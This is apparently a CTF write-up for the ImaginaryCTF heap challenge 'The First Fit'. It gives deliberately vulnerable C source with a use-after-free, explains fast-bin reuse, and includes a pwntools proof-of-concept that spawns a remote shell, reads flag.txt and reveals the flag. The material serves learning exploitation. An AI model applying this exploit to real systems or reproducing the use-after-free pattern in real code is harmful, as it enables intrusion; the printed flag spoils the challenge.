# The First Fit

## Challenge Description
`Let's get started with a simple heap exploit!`

## Challenge
> TDLR: Exploit Use-After-Free vulnerability. Call `malloc()` to allocate memory to variable b, call `free(a)`, call `free(b)` (although the memory is freed, variable b is still pointing to the address), call `malloc()` to allocate memory to variable a (variable a points to the same memory address as variable b). Write “/bin/sh” to the memory via option 3. Run system('/bin/sh') via option 4

### Given source code
```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
  int choice, choice2;
  char *a = malloc(128);
  char *b;
  setvbuf(stdout,NULL,2,0);
  setvbuf(stdin,NULL,2,0);
  while (1) {
    printf("a is at %p\n", a);
    printf("b is at %p\n", b);
    printf("1: Malloc\n2: Free\n3: Fill a\n4: System b\n> ");
    scanf("%d", &choice);
    switch(choice) {
      case 1:
              printf("What do I malloc?\n(1) a\n(2) b\n>> ");
              scanf("%d", &choice2);
              if (choice2 == 1)
                a = malloc(128);
              else if (choice2 == 2)
                b = malloc(128);
              break;
      case 2:
              printf("What do I free?\n(1) a\n(2) b\n>> ");
              scanf("%d", &choice2);
              if (choice2 == 1)
                free(a);
              else if (choice2 == 2)
                free(b);
              break;
      case 3: printf(">> "); scanf("%8s", a); break;
      case 4: system((char*)b); break;
      default: return -1;
    }
  }
  return 0;
}
```

### Background knowledge about fast bin
The heap manager maintains 5 types of bins: small bin, large bin, unsorted bin, fast bin and tcache bins. These bins are used to improve performance of memory allocation and free.

Fast bin stores recently released memory and is reused when malloc() is called soon after the memory is freed. When memory is freed, it is inserted to the HEAD of the list. When memory is allocated, it is removed from the HEAD of the list. This is because fast bin is implemented using a single linked list.

Example: <br />
When free(a) is called: <br />
HEAD -> memory(a) -> TAIL <br />

When free(b) is called: <br />
Head -> memory(b) -> memory(a) -> Tail

When malloc() is called: <br />
Head -> memory(a) -> Tail [memory(b) is allocated first]

### Solution
Goal: Make variable b points to ‘/bin/sh’ string, then I can call system('/bin/sh') via option 4.

Solution: Call `malloc()` to allocate memory to variable b, call `free(a)`, call `free(b)` (although the memory is freed, variable b is still pointing to the address), call `malloc()` to allocate memory to variable a (variable a points to the same memory address as variable b). Write “/bin/sh” to the memory via option 3. Run system('/bin/sh') via option 4

Working POC:
``` python
from pwn import *

r = remote('chal.imaginaryctf.org', 42003)
print(r.recvuntil(b'>'))
r.sendline(b'1') # select 'malloc' option
print(r.recvuntil(b'>>'))
r.sendline(b'2') # b = malloc(128)
print(r.recvuntil(b'>'))
r.sendline(b'2') # select 'free' option
print(r.recvuntil(b'>>'))
r.sendline(b'1') # free(a)
print(r.recvuntil(b'>'))
r.sendline(b'2') # select 'free' option
print(r.recvuntil(b'>>'))
r.sendline(b'2') # free(b)
print(r.recvuntil(b'>'))
r.sendline(b'1') # select 'malloc' option
print(r.recvuntil(b'>>'))
r.sendline(b'1') # a = malloc(128) ('a' point to the same address as 'b')
print(r.recvuntil(b'>'))
r.sendline(b'3')
print(r.recvuntil(b'>>'))
r.sendline(b'/bin/sh') # store "/bin/sh" in 'a' (also in 'b')
print(r.recvuntil(b'>'))
r.sendline(b'4') # system((char*)b) -> system('/bin.sh')
r.interactive()
```

Output of the script:
```bash
$ python3 heap.py
[+] Opening connection to chal.imaginaryctf.org on port 42003: Done
b'a is at 0x5565706eb2a0\nb is at 0x7ffd58d43ad0\n1: Malloc\n2: Free\n3: Fill a\n4: System b\n>'
b' What do I malloc?\n(1) a\n(2) b\n>>'
b' a is at 0x5565706eb2a0\nb is at 0x5565706eb330\n1: Malloc\n2: Free\n3: Fill a\n4: System b\n>'
b' What do I free?\n(1) a\n(2) b\n>>'
b' a is at 0x5565706eb2a0\nb is at 0x5565706eb330\n1: Malloc\n2: Free\n3: Fill a\n4: System b\n>'
b' What do I free?\n(1) a\n(2) b\n>>'
b' a is at 0x5565706eb2a0\nb is at 0x5565706eb330\n1: Malloc\n2: Free\n3: Fill a\n4: System b\n>'
b' What do I malloc?\n(1) a\n(2) b\n>>'
b' a is at 0x5565706eb330\nb is at 0x5565706eb330\n1: Malloc\n2: Free\n3: Fill a\n4: System b\n>'
b' >>'
b' a is at 0x5565706eb330\nb is at 0x5565706eb330\n1: Malloc\n2: Free\n3: Fill a\n4: System b\n>'
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
ictf{w3lc0me_t0_h34p_24bd59b0}
```

Flag: `ictf{w3lc0me_t0_h34p_24bd59b0}`

## Resource:
- https://heap-exploitation.dhavalkapil.com/attacks/first_fit
- https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/